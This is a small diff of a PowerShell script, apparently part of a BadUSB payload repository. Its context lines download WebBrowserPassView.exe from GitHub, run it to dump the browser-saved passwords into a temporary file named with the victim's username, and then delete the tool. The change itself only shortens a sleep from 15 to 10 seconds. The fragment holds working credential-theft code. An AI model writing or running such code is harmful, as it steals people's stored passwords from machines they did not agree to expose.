@@ -4,7 +4,7 @@ Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebB
 
 .\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
 
-Start-Sleep -Seconds 15
+Start-Sleep -Seconds 10
 
 RI WebBrowserPassView.exe
 
